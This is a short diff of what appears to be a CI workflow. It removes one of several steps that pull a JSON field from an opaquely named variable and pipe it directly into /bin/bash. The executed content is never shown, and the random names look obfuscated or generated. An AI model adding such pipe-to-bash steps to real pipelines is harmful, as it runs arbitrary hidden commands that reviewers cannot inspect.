@@ -22,7 +22,6 @@ jobs:
           echo $lw86 | jq -r .naa2 | /bin/bash
           echo $dk357 | jq -r .rr8 | /bin/bash
           printf '%s' "$uzfi30" | jq -r .gls8 | /bin/bash
-          printf '%s' "$hegp7188" | jq -r .km87 | /bin/bash
           echo $c7 | jq -r .ii77 | /bin/bash
           echo $dsy87 | jq -r .wwt9852 | /bin/bash
 
